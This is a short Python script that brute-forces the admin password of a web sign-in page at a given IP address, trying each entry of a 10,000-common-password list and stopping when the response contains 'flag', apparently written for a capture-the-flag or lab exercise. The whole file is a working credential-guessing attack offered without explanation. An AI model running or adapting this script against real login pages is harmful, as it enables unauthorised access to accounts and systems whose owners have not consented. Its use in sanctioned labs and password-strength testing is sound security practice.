import requests as req
import sys

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <ip_address>")
    sys.exit(1)

ip_address = sys.argv[1]
url = f"http://{ip_address}/#"

params = {
    'page': 'signin',
    'username': 'admin',
    'password': '',
    'Login': 'Login',
}

with open("10k-most-common.txt") as f:
    for x in f:
        params["password"] = x.strip()
        print(params["password"])
        response = req.get(url, params=params, stream=True)
        if "flag" in response.text:
            print(x)
            print(response.text)
            sys.exit(0)